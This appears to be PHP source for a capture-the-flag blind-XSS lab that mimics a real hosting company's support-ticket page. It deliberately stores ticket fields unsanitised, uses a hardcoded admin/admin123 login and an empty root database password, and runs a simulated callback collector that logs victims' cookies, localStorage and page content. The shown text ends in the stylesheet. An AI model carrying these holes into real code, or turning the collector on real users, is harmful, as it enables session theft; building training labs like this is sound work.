<?php
// Lab 64 — Blind XSS via Support Ticket Form
// Platform: ZAP-Hosting (zap-hosting.com/en/security/) — real-world Blind XSS
// Vulnerability: Name, Subject, Message stored raw, rendered via innerHTML in admin panel
// Attack flow: Attacker submits payload → admin views ticket → XSS fires in admin browser
//              → attacker receives callback (simulated xss.report) with cookies, IP, URL, DOM

session_start();

$host = 'localhost';
$db   = 'VexiumCTF';
$user = 'root';
$pass = '';

try {
    $pdo = new PDO("mysql:host=$host;dbname=$db;charset=utf8mb4", $user, $pass, [
        PDO::ATTR_ERRMODE        => PDO::ERRMODE_EXCEPTION,
        PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC
    ]);
} catch (Exception $e) {
    die('DB connection failed');
}

// ── Tables ──────────────────────────────────────────────────────────────────

$pdo->exec("CREATE TABLE IF NOT EXISTS lab64_tickets (
    id INT AUTO_INCREMENT PRIMARY KEY,
    name VARCHAR(200) DEFAULT '',
    email VARCHAR(200) DEFAULT '',
    subject VARCHAR(500) DEFAULT '',
    message TEXT DEFAULT '',
    ip VARCHAR(64) DEFAULT '',
    user_agent VARCHAR(500) DEFAULT '',
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
)");

$pdo->exec("CREATE TABLE IF NOT EXISTS lab64_callbacks (
    id INT AUTO_INCREMENT PRIMARY KEY,
    ticket_id INT DEFAULT 0,
    uri VARCHAR(1000) DEFAULT '',
    cookies TEXT DEFAULT '',
    referrer VARCHAR(1000) DEFAULT '',
    user_agent VARCHAR(500) DEFAULT '',
    origin VARCHAR(300) DEFAULT '',
    ip VARCHAR(64) DEFAULT '',
    local_storage TEXT DEFAULT '',
    dom_excerpt TEXT DEFAULT '',
    triggered_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
)");

// Seed safe demo tickets
$sc = $pdo->query("SELECT COUNT(*) FROM lab64_tickets")->fetchColumn();
if ($sc == 0) {
    $ins = $pdo->prepare("INSERT INTO lab64_tickets (name,email,subject,message,ip,user_agent) VALUES (?,?,?,?,?,?)");
    $ins->execute([
        'John D.', 'john@example.com',
        'FiveM server not responding',
        "My FiveM server has been offline for about 2 hours. I've tried restarting it from the panel but it stays in 'Starting' state. Order #ZAP-789231. Please help urgently.",
        '92.42.44.25', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/119.0.0.0'
    ]);
    $ins->execute([
        'Maria K.', 'maria@example.com',
        'Billing — charged twice for Minecraft plan',
        "Hello, I notice I have been charged twice for my Minecraft server plan this month. My invoice #INV-20231101 shows a duplicate charge of €5.99. Could you please refund the duplicate? Thank you.",
        '88.111.22.50', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/537.36'
    ]);
}

// ── JSON API endpoints ───────────────────────────────────────────────────────

if (isset($_GET['action'])) {
    header('Content-Type: application/json');
    $action = $_GET['action'];

    // Submit ticket (vulnerable: stores name/subject/message raw)
    if ($action === 'submit_ticket') {
        $b = json_decode(file_get_contents('php://input'), true);
        $name    = $b['name']    ?? '';         // ⚠ NOT sanitised
        $email   = htmlspecialchars($b['email'] ?? '', ENT_QUOTES); // email is safe
        $subject = $b['subject'] ?? '';         // ⚠ NOT sanitised
        $message = $b['message'] ?? '';         // ⚠ NOT sanitised
        if (trim($subject) === '') { echo json_encode(['ok'=>false,'message'=>'Subject is required.']); exit; }
        $ip = $_SERVER['REMOTE_ADDR'] ?? '';
        $ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
        $pdo->prepare("INSERT INTO lab64_tickets (name,email,subject,message,ip,user_agent) VALUES (?,?,?,?,?,?)")
            ->execute([$name, $email, $subject, $message, $ip, $ua]);
        $tid = $pdo->lastInsertId();
        echo json_encode(['ok'=>true,'ticket_id'=>(int)$tid]);
        exit;
    }

    // Get all tickets (for admin panel)
    if ($action === 'get_tickets') {
        $rows = $pdo->query("SELECT id,name,email,subject,created_at FROM lab64_tickets ORDER BY id DESC")->fetchAll();
        echo json_encode(['ok'=>true,'tickets'=>$rows]);
        exit;
    }

    // Get single ticket (for ticket detail)
    if ($action === 'get_ticket') {
        $b = json_decode(file_get_contents('php://input'), true);
        $id = (int)($b['id'] ?? 0);
        $row = $pdo->prepare("SELECT * FROM lab64_tickets WHERE id=?");
        $row->execute([$id]);
        $ticket = $row->fetch();
        if (!$ticket) { echo json_encode(['ok'=>false,'message'=>'Not found']); exit; }
        echo json_encode(['ok'=>true,'ticket'=>$ticket]);
        exit;
    }

    // Log XSS callback (simulates what xss.report receives)
    if ($action === 'xss_callback') {
        $b = json_decode(file_get_contents('php://input'), true);
        $tid      = (int)($b['ticket_id'] ?? 0);
        $uri      = $b['uri']           ?? '';
        $cookies  = $b['cookies']       ?? '';
        $referrer = $b['referrer']      ?? '';
        $ua       = $b['user_agent']    ?? '';
        $origin   = $b['origin']        ?? '';
        $ip       = $_SERVER['REMOTE_ADDR'] ?? '';
        $ls       = $b['local_storage'] ?? '';
        $dom      = $b['dom']           ?? '';
        $pdo->prepare("INSERT INTO lab64_callbacks (ticket_id,uri,cookies,referrer,user_agent,origin,ip,local_storage,dom_excerpt) VALUES (?,?,?,?,?,?,?,?,?)")
            ->execute([$tid,$uri,$cookies,$referrer,$ua,$origin,$ip,$ls,$dom]);
        echo json_encode(['ok'=>true]);
        exit;
    }

    // Get callbacks (for attacker panel)
    if ($action === 'get_callbacks') {
        $rows = $pdo->query("SELECT * FROM lab64_callbacks ORDER BY id DESC LIMIT 20")->fetchAll();
        echo json_encode(['ok'=>true,'callbacks'=>$rows]);
        exit;
    }

    // Clear callbacks
    if ($action === 'clear_callbacks') {
        $pdo->exec("DELETE FROM lab64_callbacks");
        echo json_encode(['ok'=>true]);
        exit;
    }

    echo json_encode(['ok'=>false,'message'=>'Unknown action']);
    exit;
}

// ── Admin credentials ────────────────────────────────────────────────────────
define('LAB64_ADMIN_USER', 'admin');
define('LAB64_ADMIN_PASS', 'admin123');

// Handle logout
if (isset($_GET['view']) && $_GET['view'] === 'admin_logout') {
    unset($_SESSION['lab64_admin']);
    header('Location: index.php?view=admin_login');
    exit;
}

// Handle login form POST
$loginError = '';
if (isset($_POST['lab64_login'])) {
    if ($_POST['username'] === LAB64_ADMIN_USER && $_POST['password'] === LAB64_ADMIN_PASS) {
        $_SESSION['lab64_admin'] = true;
        header('Location: index.php?view=admin');
        exit;
    } else {
        $loginError = 'Invalid username or password.';
    }
}

// ── Determine view ───────────────────────────────────────────────────────────
$view = $_GET['view'] ?? 'submit';

// Gate admin & ticket views — redirect to login if not authenticated
if (in_array($view, ['admin', 'ticket']) && empty($_SESSION['lab64_admin'])) {
    header('Location: index.php?view=admin_login');
    exit;
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>ZAP Support — <?php echo $view==='admin'?'Admin Panel':($view==='admin_login'?'Admin Login':($view==='callbacks'?'XSS Callbacks':'Submit Ticket')); ?></title>
<style>
*,*::before,*::after{box-sizing:border-box;margin:0;padding:0;}
:root{
  --bg:#0d1117;--card:#161b22;--card2:#1c2128;--border:#30363d;
  --cyan:#00d4aa;--cyan-d:#00a887;--red:#f85149;--yellow:#e3b341;
  --green:#3fb950;--blue:#58a6ff;--purple:#bc8cff;
  --text:#c9d1d9;--text2:#8b949e;--white:#f0f6fc;
}
html,body{min-height:100vh;background:var(--bg);color:var(--text);font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;font-size:14px;}
a{color:var(--cyan);text-decoration:none;}
a:hover{text-decoration:underline;}
button{cursor:pointer;font-family:inherit;}
input,textarea,select{font-family:inherit;}

/* ── Topbar ── */
.topbar{background:var(--card);border-bottom:1px solid var(--border);padding:0 24px;height:56px;display:flex;align-items:center;gap:16px;position:sticky;top:0;z-index:100;}
.topbar-logo{display:flex;align-items:center;gap:9px;font-weight:700;font-size:1.1rem;color:var(--white);}
.topbar-logo-icon{width:30px;height:30px;background:linear-gradient(135deg,var(--cyan),#0077b6);border-radius:6px;display:flex;align-items:center;justify-content:center;}
.topbar-logo-icon svg{width:18px;height:18px;fill:#fff;}
.topbar-nav{display:flex;gap:4px;margin-left:auto;}
.nav-btn{padding:6px 14px;border-radius:6px;border:none;background:transparent;color:var(--text2);font-size:13px;font-weight:500;transition:all .2s;}
.nav-btn:hover,.nav-btn.active{background:rgba(0,212,170,.12);color:var(--cyan);}
.nav-btn.danger{color:var(--red);}
.nav-btn.danger:hover{background:rgba(248,81,73,.12);}

/* ── Hero ── */
.hero{background:linear-gradient(135deg,#0d1117 0%,#0d2234 50%,#0d1117 100%);border-bottom:1px solid var(--border);padding:40px 24px 32px;}
.hero-inner{max-width:860px;margin:0 auto;}
.hero h1{font-size:1.7rem;font-weight:700;color:var(--white);margin-bottom:6px;}
.hero p{color:var(--text2);font-size:.93rem;}
.hero-tags{display:flex;gap:8px;margin-top:14px;flex-wrap:wrap;}
.htag{padding:3px 10px;border-radius:20px;font-size:.75rem;font-weight:600;border:1px solid;}
.htag.blind{color:#f85149;border-color:#f85149;background:rgba(248,81,73,.08);}
.htag.stored{color:#e3b341;border-color:#e3b341;background:rgba(227,179,65,.08);}
.htag.rw{color:#3fb950;border-color:#3fb950;background:rgba(63,185,80,.08);}
.htag.hard{color:#bc8cff;border-color:#bc8cff;background:rgba(188,140,255,.08);}

/* ── Layout ── */
.layout{max-width:860px;margin:32px auto;padding:0 24px;}
.two-col{display:grid;grid-template-columns:1fr 1fr;gap:20px;}
@media(max-width:660px){.two-col{grid-template-columns:1fr;}}

/* ── Cards ── */
.card{background:var(--card);border:1px solid var(--border);border-radius:10px;overflow:hidden;}
.card-header{padding:14px 18px;border-bottom:1px solid var(--border);display:flex;align-items:center;gap:8px;font-weight:600;color:var(--white);}
.card-header svg{width:16px;height:16px;flex-shrink:0;}
.card-body{padding:18px;}

/* ── Form ── */
.fg{margin-bottom:14px;}
.fg label{display:block;margin-bottom:5px;font-size:.8rem;font-weight:600;color:var(--text2);text-transform:uppercase;letter-spacing:.5px;}
.fg label span.opt{font-weight:400;color:var(--text2);text-transform:none;letter-spacing:0;font-size:.75rem;}
.fc{width:100%;padding:9px 12px;background:var(--card2);border:1px solid var(--border);border-radius:6px;color:var(--white);font-size:.88rem;transition:border-color .2s,box-shadow .2s;outline:none;}
.fc:focus{border-color:var(--cyan);box-shadow:0 0 0 3px rgba(0,212,170,.15);}
.fc::placeholder{color:var(--text2);}
textarea.fc{resize:vertical;min-height:100px;}
.fh{margin-top:4px;font-size:.75rem;color:var(--text2);}
.fh.vuln{color:#f85149;}

.btn{display:inline-flex;align-items:center;gap:6px;padding:9px 18px;border-radius:6px;border:none;font-size:.88rem;font-weight:600;transition:all .2s;cursor:pointer;}
.btn-primary{background:var(--cyan);color:#000;}
.btn-primary:hover{background:var(--cyan-d);}
.btn-ghost{background:transparent;color:var(--text2);border:1px solid var(--border);}
.btn-ghost:hover{border-color:var(--cyan);color:var(--cyan);}
.btn-danger{background:rgba(248,81,73,.15);color:var(--red);border:1px solid rgba(248,81,73,.3);}
.btn-danger:hover{background:rgba(248,81,73,.25);}
.btn-sm{padding:5px 12px;font-size:.8rem;}
.btn:disabled{opacity:.5;cursor:not-allowed;}

.err{margin-top:8px;padding:9px 12px;border-radius:6px;font-size:.83rem;display:none;}
.err.show{display:block;}
.err.ok{background:rgba(63,185,80,.12);border:1px solid rgba(63,185,80,.3);color:var(--green);}
.err.bad{background:rgba(248,81,73,.12);border:1px solid rgba(248,81,73,.3);color:var(--red);}

/* ── Ticket list ── */
.ticket-row{padding:14px 18px;border-bottom:1px solid var(--border);display:grid;grid-template-columns:auto 1fr auto;gap:12px;align-items:center;transition:background .15s;cursor:pointer;}
.ticket-row:last-child{border-bottom:none;}
.ticket-row:hover{background:var(--card2);}
.ticket-id{width:36px;height:36px;background:rgba(0,212,170,.1);border:1px solid rgba(0,212,170,.2);border-radius:8px;display:flex;align-items:center;justify-content:center;font-weight:700;font-size:.8rem;color:var(--cyan);}
.ticket-info{}
.ticket-name{font-weight:600;color:var(--white);font-size:.88rem;margin-bottom:2px;}
.ticket-sub{color:var(--text2);font-size:.8rem;}
.ticket-time{font-size:.75rem;color:var(--text2);white-space:nowrap;}

/* ── Ticket detail ── */
.detail-field{margin-bottom:18px;}
.detail-label{font-size:.75rem;font-weight:700;text-transform:uppercase;letter-spacing:.5px;color:var(--text2);margin-bottom:6px;}
.detail-val{background:var(--card2);border:1px solid var(--border);border-radius:6px;padding:10px 13px;color:var(--white);font-size:.88rem;line-height:1.5;white-space:pre-wrap;word-break:break-word;}
.detail-val.vuln-sink{border-color:rgba(248,81,73,.3);}

/* ── Info/vuln box ── */
.info-box{padding:14px 16px;border-radius:8px;margin-bottom:18px;font-size:.85rem;line-height:1.6;}
.info-box.warn{background:rgba(227,179,65,.08);border:1px solid rgba(227,179,65,.25);color:var(--yellow);}
.info-box.danger{background:rgba(248,81,73,.08);border:1px solid rgba(248,81,73,.25);color:#f85149;}
.info-box.info{background:rgba(0,212,170,.07);border:1px solid rgba(0,212,170,.2);color:var(--cyan);}
.info-box code{background:rgba(0,0,0,.3);padding:1px 5px;border-radius:3px;font-size:.82rem;}

/* ── Callback panel ── */
.cb-card{background:var(--card);border:1px solid var(--border);border-radius:10px;margin-bottom:16px;overflow:hidden;}
.cb-header{background:rgba(248,81,73,.08);border-bottom:1px solid rgba(248,81,73,.2);padding:12px 16px;display:flex;align-items:center;gap:10px;}
.cb-dot{width:10px;height:10px;border-radius:50%;background:var(--red);animation:pulse 1s infinite;}
@keyframes pulse{0%,100%{opacity:1;}50%{opacity:.4;}}
.cb-title{font-weight:700;color:var(--red);font-size:.88rem;}
.cb-time{margin-left:auto;font-size:.75rem;color:var(--text2);}
.cb-body{padding:14px 16px;}
.cb-row{display:grid;grid-template-columns:130px 1fr;gap:8px;padding:5px 0;border-bottom:1px solid var(--border);font-size:.82rem;}
.cb-row:last-child{border-bottom:none;}
.cb-key{color:var(--cyan);font-weight:600;}
.cb-v{color:var(--text);word-break:break-all;}
.cb-v.red{color:var(--red);}

/* ── XSS fired modal (admin side) ── */
.modal-overlay{position:fixed;inset:0;background:rgba(0,0,0,.75);z-index:999;display:none;align-items:center;justify-content:center;}
.modal-overlay.show{display:flex;}
.modal{background:var(--card);border:1px solid rgba(248,81,73,.4);border-radius:12px;max-width:560px;width:calc(100% - 32px);max-height:85vh;overflow-y:auto;box-shadow:0 0 40px rgba(248,81,73,.2);}
.modal-hdr{background:rgba(248,81,73,.1);padding:16px 20px;border-bottom:1px solid rgba(248,81,73,.25);display:flex;align-items:center;gap:10px;}
.modal-hdr-icon{width:32px;height:32px;background:rgba(248,81,73,.15);border:1px solid rgba(248,81,73,.3);border-radius:8px;display:flex;align-items:center;justify-content:center;}
.modal-hdr svg{width:16px;height:16px;fill:var(--red);}
.modal-hdr-title{font-weight:700;color:var(--red);font-size:.95rem;}
.modal-hdr-sub{font-size:.75rem;color:var(--text2);margin-top:2px;}
.modal-close{margin-left:auto;background:none;border:none;color:var(--text2);font-size:1.2rem;cursor:pointer;padding:4px 8px;border-radius:4px;}
.modal-close:hover{color:var(--white);background:var(--card2);}
.modal-body{padding:18px 20px;}
.modal-field{margin-bottom:12px;}
.modal-field-lbl{font-size:.7rem;font-weight:700;text-transform:uppercase;letter-spacing:.5px;color:var(--text2);margin-bottom:4px;}
.modal-field-val{background:var(--card2);border:1px solid var(--border);border-radius:5px;padding:7px 10px;color:var(--white);font-size:.8rem;word-break:break-all;}
.modal-field-val.red{color:var(--red);}
.modal-field-val.green{color:var(--green);}

/* ── Step flow (public page) ── */
.steps{counter-reset:step;display:flex;flex-direction:column;gap:14px;}
.step{display:flex;gap:12px;align-items:flex-start;}
.step-num{flex-shrink:0;width:26px;height:26px;border-radius:50%;background:rgba(0,212,170,.12);border:1px solid var(--cyan);color:var(--cyan);font-size:.75rem;font-weight:700;display:flex;align-items:center;justify-content:center;}
.step-text{font-size:.84rem;color:var(--text);line-height:1.5;padding-top:3px;}
.step-text strong{color:var(--white);}
.step-text code{background:rgba(0,0,0,.4);padding:1px 5px;border-radius:3px;font-size:.78rem;color:var(--cyan);}

/* ── Badge ── */
.badge{display:inline-flex;align-items:center;gap:5px;padding:3px 9px;border-radius:20px;font-size:.75rem;font-weight:600;}
.badge-red{background:rgba(248,81,73,.15);color:var(--red);border:1px solid rgba(248,81,73,.3);}
.badge-green{background:rgba(63,185,80,.15);color:var(--green);border:1px solid rgba(63,185,80,.3);}

/* ── Toast ── */
.toast{position:fixed;bottom:24px;right:24px;background:var(--card);border:1px solid var(--border);border-radius:8px;padding:12px 18px;font-size:.85rem;color:var(--white);opacity:0;transform:translateY(10px);transition:all .3s;pointer-events:none;z-index:2000;}
.toast.show{opacity:1;transform:translateY(0);}
.toast.ok{border-color:var(--green);}
.toast.err{border-color:var(--red);}

/* ── Payload hint ── */
.payload-box{background:rgba(0,0,0,.5);border:1px solid var(--border);border-radius:6px;padding:10px 13px;font-size:.78rem;color:#58a6ff;font-family:'Courier New',monospace;word-break:break-all;margin:6px 0;cursor:pointer;transition:border-color .2s;}
.payload-box:hover{border-color:var(--cyan);}

.empty-state{padding:40px 20px;text-align:center;color:var(--text2);}
.empty-state svg{width:36px;height:36px;margin:0 auto 10px;display:block;fill:var(--text2);}

.back-btn{display:inline-flex;align-items:center;gap:6px;padding:6px 12px;border-radius:6px;border:1px solid var(--border);background:transparent;color:var(--text2);font-size:.82rem;cursor:pointer;transition:all .2s;margin-bottom:18px;}
.back-btn:hover{border-color:var(--cyan);color:var(--cyan);}

.vuln-arrow{display:inline-block;padding:2px 7px;background:rgba(248,81,73,.12);border:1px solid rgba(248,81,73,.25);border-radius:3px;color:var(--red);font-size:.7rem;font-weight:700;margin-left:6px;}

.section-hdr{display:flex;align-items:center;gap:10px;margin-bottom:18px;}
.section-hdr h2{font-size:1.05rem;font-weight:700;color:var(--white);}
.section-hdr-line{flex:1;height:1px;background:var(--border);}

/* ── ZAP-Hosting Homepage (submit view only) ─────────────────────── */
body.zap-page{background:#0a0e18;}
body.zap-page .topbar{display:none;}
body.admin-login-page .topbar{display:none;}

.lab-notice{background:#0d1117;border-bottom:2px solid #4caf50;padding:5px 16px;display:flex;align-items:center;gap:12px;font-size:.72rem;color:#6b7280;flex-wrap:wrap;}
.lab-notice strong{color:#4caf50;}
.lab-notice a{color:#4caf50;text-decoration:underline;}
.lab-notice-sep{color:#374151;}

/* ZAP top navigation */
.zap-nav{background:#1c232e;border-bottom:1px solid #253040;}
.zap-nav-inner{max-width:1280px;margin:0 auto;padding:0 16px;display:flex;align-items:center;height:54px;gap:0;}
.zap-logo{display:flex;align-items:center;gap:10px;text-decoration:none;margin-right:20px;flex-shrink:0;}
.zap-logo-box{background:#fff;border-radius:5px;width:38px;height:38px;display:flex;align-items:center;justify-content:center;}
.zap-logo-svg{width:24px;height:24px;}
.zap-logo-name{color:#fff;font-weight:800;font-size:1rem;letter-spacing:.5px;}
.zap-logo-name span{color:#4caf50;}
.zap-navlinks{display:flex;flex:1;gap:1px;overflow:hidden;}
.zap-navlink{padding:5px 10px;color:#9ca3af;font-size:.8rem;text-decoration:none;border-radius:5px;white-space:nowrap;transition:all .15s;display:flex;align-items:center;gap:3px;cursor:pointer;background:none;border:none;font-family:inherit;}
.zap-navlink:hover,.zap-navlink.active{color:#fff;background:rgba(255,255,255,.06);}
.zap-navlink svg{width:9px;height:9px;fill:currentColor;}
.zap-nav-search{position:relative;margin:0 8px;}
.zap-nav-search-icon{position:absolute;left:8px;top:50%;transform:translateY(-50%);width:12px;height:12px;fill:#6b7280;pointer-events:none;}
.zap-nav-search input{background:rgba(255,255,255,.05);border:1px solid rgba(255,255,255,.08);border-radius:6px;padding:5px 10px 5px 26px;color:#e2e8f0;font-size:.78rem;width:120px;outline:none;transition:all .2s;}
.zap-nav-search input:focus{border-color:#4caf50;width:160px;}
.zap-nav-search input::placeholder{color:#6b7280;}
.zap-nav-actions{display:flex;align-items:center;gap:6px;flex-shrink:0;}
.zn-btn{padding:5px 13px;border-radius:5px;font-size:.78rem;font-weight:600;cursor:pointer;transition:all .2s;border:none;font-family:inherit;}
.zn-login{background:transparent;border:1px solid rgba(255,255,255,.15);color:#e2e8f0;}
.zn-login:hover{border-color:#4caf50;color:#4caf50;}
.zn-signup{background:#4caf50;color:#fff;}
.zn-signup:hover{background:#43a047;}
.zn-social{width:28px;height:28px;border-radius:5px;border:none;cursor:pointer;display:flex;align-items:center;justify-content:center;transition:opacity .2s;padding:0;}
.zn-social:hover{opacity:.8;}
.zn-social svg{width:14px;height:14px;fill:#fff;}
.zn-discord{background:#5865f2;}
.zn-twitch{background:#9146ff;}
.zn-google{background:#fff;}
.zn-google svg{fill:#4285f4;}
.zn-facebook{background:#1877f2;}
.zap-support-link{padding:5px 11px;border-radius:5px;background:rgba(76,175,80,.12);border:1px solid rgba(76,175,80,.3);color:#4caf50;font-size:.78rem;font-weight:600;cursor:pointer;font-family:inherit;transition:all .2s;margin-left:6px;}
.zap-support-link:hover{background:rgba(76,175,80,.22);}

/* ZAP Hero section */
.zap-hero{background:linear-gradient(160deg,#080c17 0%,#0d1527 55%,#081018 100%);position:relative;overflow:hidden;padding:56px 16px 48px;}
.zap-hero::before{content:'';position:absolute;inset:0;background-image:linear-gradient(rgba(255,255,255,.018) 1px,transparent 1px),linear-gradient(90deg,rgba(255,255,255,.018) 1px,transparent 1px);background-size:55px 55px;}
.zap-hero-inner{max-width:1100px;margin:0 auto;display:grid;grid-template-columns:1fr 370px;gap:52px;align-items:center;position:relative;z-index:1;}
@media(max-width:820px){.zap-hero-inner{grid-template-columns:1fr;gap:36px;}}
.zap-server-badge{display:inline-flex;align-items:center;gap:7px;background:rgba(76,175,80,.1);border:1px solid rgba(76,175,80,.25);border-radius:20px;padding:4px 12px;font-size:.75rem;color:#4caf50;font-weight:600;margin-bottom:16px;}
.zap-server-badge::before{content:'';width:7px;height:7px;border-radius:50%;background:#4caf50;}
.zap-hero-h1{font-size:2rem;font-weight:800;color:#fff;line-height:1.25;margin-bottom:14px;}
.zap-hero-h1 span{color:#4caf50;}
.zap-hero-desc{color:#9ca3af;font-size:.9rem;line-height:1.65;margin-bottom:22px;}
.zap-features{display:flex;flex-direction:column;gap:9px;}
.zap-feature{display:flex;align-items:center;gap:9px;color:#cbd5e0;font-size:.84rem;}
.zap-feature-check{width:16px;height:16px;border-radius:50%;background:rgba(76,175,80,.15);border:1px solid #4caf50;display:flex;align-items:center;justify-content:center;flex-shrink:0;}
.zap-feature-check svg{width:9px;height:9px;fill:#4caf50;}

/* ZAP Register form (right side) */
.zap-regform{background:rgba(255,255,255,.03);border:1px solid rgba(255,255,255,.07);border-radius:10px;padding:24px;backdrop-filter:blur(8px);}
.zap-regform h3{color:#e2e8f0;font-size:.95rem;font-weight:600;text-align:center;margin-bottom:16px;}
.zap-ri{width:100%;background:rgba(255,255,255,.06);border:1px solid rgba(255,255,255,.09);border-radius:6px;padding:9px 12px;color:#e2e8f0;font-size:.85rem;margin-bottom:10px;outline:none;transition:border-color .2s;font-family:inherit;}
.zap-ri:focus{border-color:#4caf50;background:rgba(255,255,255,.08);}
.zap-ri::placeholder{color:#6b7280;}
.zap-reg-btn{width:100%;background:#4caf50;border:none;border-radius:6px;padding:11px;color:#fff;font-size:.88rem;font-weight:700;cursor:pointer;margin-bottom:14px;transition:background .2s;font-family:inherit;}
.zap-reg-btn:hover{background:#43a047;}
.zap-divider{text-align:center;color:#4b5563;font-size:.75rem;margin-bottom:12px;position:relative;}
.zap-divider::before,.zap-divider::after{content:'';position:absolute;top:50%;width:42%;height:1px;background:rgba(255,255,255,.06);}
.zap-divider::before{left:0;}.zap-divider::after{right:0;}
.zap-socials{display:flex;gap:8px;}
.zap-social-btn{flex:1;padding:8px 4px;border-radius:6px;border:1px solid rgba(255,255,255,.08);background:rgba(255,255,255,.03);color:#9ca3af;font-size:.72rem;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:4px;transition:all .2s;font-family:inherit;}
.zap-social-btn:hover{border-color:rgba(255,255,255,.2);color:#e2e8f0;}
.zap-social-btn svg{width:13px;height:13px;}
.zap-login-link{text-align:center;margin-top:12px;font-size:.75rem;color:#6b7280;}
.zap-login-link a{color:#4caf50;}

/* Stats bar */
.zap-stats{background:#0d1117;border-top:1px solid #1a2233;border-bottom:1px solid #1a2233;padding:18px 0;}
.zap-stats-inner{max-width:1100px;margin:0 auto;padding:0 16px;display:flex;justify-content:space-around;gap:12px;flex-wrap:wrap;}
.zap-stat{text-align:center;}
.zap-stat-num{font-size:1.4rem;font-weight:800;color:#4caf50;}
.zap-stat-label{font-size:.7rem;color:#6b7280;margin-top:2px;}

/* Floating support widgets */
.zap-float{position:fixed;right:0;top:50%;transform:translateY(-50%);z-index:40;display:flex;flex-direction:column;gap:3px;}
.zap-float-btn{width:36px;height:36px;background:#253040;border:1px solid #2e3f52;border-right:none;border-radius:6px 0 0 6px;display:flex;align-items:center;justify-content:center;cursor:pointer;transition:background .2s;}
.zap-float-btn:hover{background:#2e3f52;}
.zap-float-btn svg{width:15px;height:15px;fill:#6b7280;}

/* Payloads section */
.zap-edu{background:#0a0e18;border-top:2px solid rgba(76,175,80,.15);padding:36px 16px;}
.zap-edu-inner{max-width:1000px;margin:0 auto;}
.zap-edu-grid{display:grid;grid-template-columns:1fr 1fr;gap:20px;margin-top:20px;}
@media(max-width:680px){.zap-edu-grid{grid-template-columns:1fr;}}
.zap-edu-title{font-size:1.1rem;font-weight:700;color:#e2e8f0;margin-bottom:4px;}
.zap-edu-sub{font-size:.82rem;color:#6b7280;}

/* White ticket modal (exact ZAP design) */
.zt-overlay{position:fixed;inset:0;background:rgba(5,8,15,.7);z-index:600;display:none;align-items:flex-start;justify-content:center;padding:40px 16px;overflow-y:auto;}
.zt-overlay.show{display:flex;}
.zt-modal{background:#fff;border-radius:6px;max-width:580px;width:100%;box-shadow:0 24px 64px rgba(0,0,0,.5);}
.zt-header{padding:20px 24px 16px;border-bottom:1px solid #e5e7eb;display:flex;align-items:center;gap:14px;}
.zt-icon{width:38px;height:38px;background:#f3f4f6;border-radius:5px;display:flex;align-items:center;justify-content:center;flex-shrink:0;}
.zt-icon svg{width:20px;height:20px;fill:#9ca3af;}
.zt-title{font-size:.98rem;font-weight:700;color:#111827;}
.zt-avg{font-size:.75rem;color:#9ca3af;margin-top:2px;}
.zt-avg strong{color:#374151;}
.zt-body{padding:22px 24px 8px;}
.zt-row2{display:grid;grid-template-columns:1fr 1fr;gap:14px;}
.zt-field{margin-bottom:14px;}
.zt-label{display:block;font-size:.82rem;color:#374151;margin-bottom:5px;}
.zt-input{width:100%;border:1px solid #d1d5db;border-radius:3px;padding:8px 10px;font-size:.87rem;color:#111827;outline:none;transition:border-color .2s;font-family:inherit;}
.zt-input:focus{border-color:#4caf50;box-shadow:0 0 0 2px rgba(76,175,80,.12);}
.zt-input::placeholder{color:#b0b7c3;}
textarea.zt-input{resize:vertical;min-height:130px;}
.zt-hint{margin-top:3px;font-size:.7rem;}
.zt-hint.vuln{color:#dc2626;font-weight:600;}
.zt-hint.safe{color:#9ca3af;}
.zt-recaptcha{border:1px solid #d1d5db;border-radius:3px;padding:11px 14px;display:flex;align-items:center;gap:12px;background:#f9fafb;margin-bottom:14px;max-width:300px;}
.zt-rc-check{width:22px;height:22px;border:2px solid #d1d5db;border-radius:3px;background:#fff;flex-shrink:0;display:flex;align-items:center;justify-content:center;cursor:pointer;transition:border-color .2s;}
.zt-rc-check.checked{border-color:#4caf50;background:#4caf50;}
.zt-rc-check.checked::after{content:'✓';color:#fff;font-size:13px;font-weight:700;}
.zt-rc-text{font-size:.82rem;color:#374151;flex:1;}
.zt-rc-logo{font-size:.55rem;color:#9ca3af;text-align:center;line-height:1.4;}
.zt-rc-logo strong{display:block;font-size:.62rem;color:#4caf50;}
.zt-msg{margin:0 24px 14px;font-size:.82rem;display:none;padding:8px 12px;border-radius:4px;}
.zt-msg.ok{display:block;background:#f0fdf4;border:1px solid #86efac;color:#166534;}
.zt-msg.bad{display:block;background:#fef2f2;border:1px solid #fca5a5;color:#991b1b;}
.zt-footer{padding:14px 24px;background:#f9fafb;border-top:1px solid #e5e7eb;border-radius:0 0 6px 6px;display:flex;align-items:center;justify-content:flex-end;gap:10px;}
.zt-submit{background:#4caf50;color:#fff;border:none;border-radius:4px;padding:9px 24px;font-size:.88rem;font-weight:700;cursor:pointer;transition:background .2s;font-family:inherit;}
.zt-submit:hover{background:#43a047;}
.zt-submit:disabled{opacity:.6;cursor:not-allowed;}
.zt-abort{background:transparent;color:#6b7280;border:none;padding:9px 14px;font-size:.88rem;cursor:pointer;transition:color .2s;font-family:inherit;}
.zt-abort:hover{color:#374151;}

/* ── Admin Login Page ───────────────────────────────────────────────────────── */
body.admin-login-page{background:#f3f4f6;min-height:100vh;display:flex;flex-direction:column;}
.aln-wrap{flex:1;display:flex;align-items:center;justify-content:center;padding:40px 16px;}
.aln-card{background:#fff;border-radius:10px;box-shadow:0 4px 24px rgba(0,0,0,.10);width:100%;max-width:420px;overflow:hidden;}
.aln-header{background:linear-gradient(135deg,#4f46e5 0%,#6366f1 100%);padding:28px 24px;text-align:center;}
.aln-header h2{color:#fff;font-size:1.25rem;font-weight:700;margin-bottom:6px;}
.aln-header p{color:rgba(255,255,255,.75);font-size:.82rem;}
.aln-body{padding:28px 24px 20px;}
.aln-field{margin-bottom:16px;}
.aln-label{display:block;font-size:.82rem;font-weight:600;color:#374151;margin-bottom:6px;}
.aln-input{width:100%;border:1px solid #d1d5db;border-radius:6px;padding:10px 12px;font-size:.88rem;color:#111827;outline:none;transition:border-color .2s;font-family:inherit;}
